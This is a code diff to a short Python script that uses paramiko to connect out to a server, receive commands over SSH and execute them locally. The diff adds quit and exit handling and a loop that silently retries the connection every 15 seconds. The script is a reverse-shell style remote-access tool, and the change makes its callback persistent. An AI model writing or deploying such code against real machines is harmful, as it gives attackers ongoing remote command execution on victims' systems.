@@ -1,6 +1,7 @@
 import paramiko
 import subprocess
 import sys
+import time
 
 #script args
 server_address = sys.argv[1]
@@ -28,8 +29,14 @@ def process_exec(client_session, command):
 
 def process_commands(client_session):
     command = client_session.recv(1024).decode('utf-8').split(" ")
-    if(command[0] == "exec"):
+    if command[0] == "exec":
         process_exec(client_session, " ".join(command[1:]))
+    elif command[0] == "quit":
+        client_session.close()
+        raise Exception
+    elif command[0] == "exit":
+        client_session.close()
+        sys.exit()
     else:
         client_session.send('[!] Command not recognized.')
 
@@ -57,4 +64,12 @@ def ssh_command(server_address, server_port, username, password):
             process_commands(client_session)
     client_session.close()
     return
-ssh_command(server_address, server_port, username, password)
+
+while True:
+    try:
+        ssh_command(server_address, server_port, username, password)
+    except KeyboardInterrupt:
+        sys.exit()
+    except Exception:
+        pass
+    time.sleep(15)
